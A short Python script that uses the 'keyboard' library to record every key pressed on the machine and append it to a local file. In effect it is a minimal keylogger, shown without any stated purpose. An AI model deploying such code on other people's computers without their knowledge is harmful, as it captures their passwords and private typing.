import keyboard

def on_key_press(event):
    with open('file.txt', 'a') as f:
        f.write(event.name + '\n')

keyboard.on_press(on_key_press)

# Wait for keys to be pressed
keyboard.wait()

